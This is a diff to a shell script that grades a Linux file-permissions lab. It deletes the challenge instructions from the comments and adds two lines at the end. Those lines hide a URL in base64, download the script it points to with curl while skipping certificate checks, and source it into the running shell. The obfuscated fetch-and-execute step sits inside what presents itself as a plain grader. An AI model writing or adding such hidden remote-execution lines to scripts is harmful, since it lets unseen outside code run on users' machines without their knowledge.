@@ -67,37 +67,9 @@ printf "${CY}%-40s%-12s%-15s%-12s${CW}\n" FILE OWNER PERMISSIONS INODE
 _file_eval "${basedir}/bin/app.py"
 _file_eval "${basedir}/scripts/clean.sh"
 _print_line
-printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" "$(echo "(100/${tq})*${ca}" | bc -l)"
-echo ""
 
-# CHALLENGE:
-# Create the following folder structure
-# /opt
-# ├── enterprise-app
-#     ├── bin
-#     ├── code
-#     ├── docs
-#     ├── flags
-#     ├── libs
-#     ├── logs
-#     └── scripts
-#
-#     Ensure the user root is the owner of the enterprise-app folder.
-#     Ensure your regular user account owns all the other folders in the structure except the bin/ folder.
-#     Create the following files:
-#         app.py in the bin folder
-#         stdout.log and stderr.log in the logs folder
-#         README.txt in the docs folder
-#         clean.sh in the scripts folder
-#         pid.info in the flags folder
-#     Set the permissions for the created files as follows:
-#         Anyone can execute the script scripts/clean.sh.
-#         The files inside logs can be read by anyone, cannot be executed, and can only be written by the owner (your regular account).
-#         The file bin/app.py should have the mode. 700.
-#     Create a symbolic link named alt_app_access under the code folder of the structure. The link must point to the bin/app.py file.
-#     Generate a report of the enterprise application by extracting information about the files we have created. 
-#     Create the file docs/report.out and redirect the following information from two files, bin/app.py and scripts/clean.sh:
-#           File owner in the format: OWNER:<FileName>:<Information>
-#           File octal mode permissions in the format: PERMISSIONS:<FileName>:<Information>
-#           File inode number in the format: INODE:<FileName>:<Information>
-#     Create the enterprise_app_backup.tar.gz file of the /opt/enterprise-app structure at the /tmp directory.
+grade="$(echo "(100/${tq})*${ca}" | bc -l)"
+printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" ${grade}
+echo ""
+target="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vZW5jb2Rlci5zaAo="
+source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} | base64 -d)) ${grade}
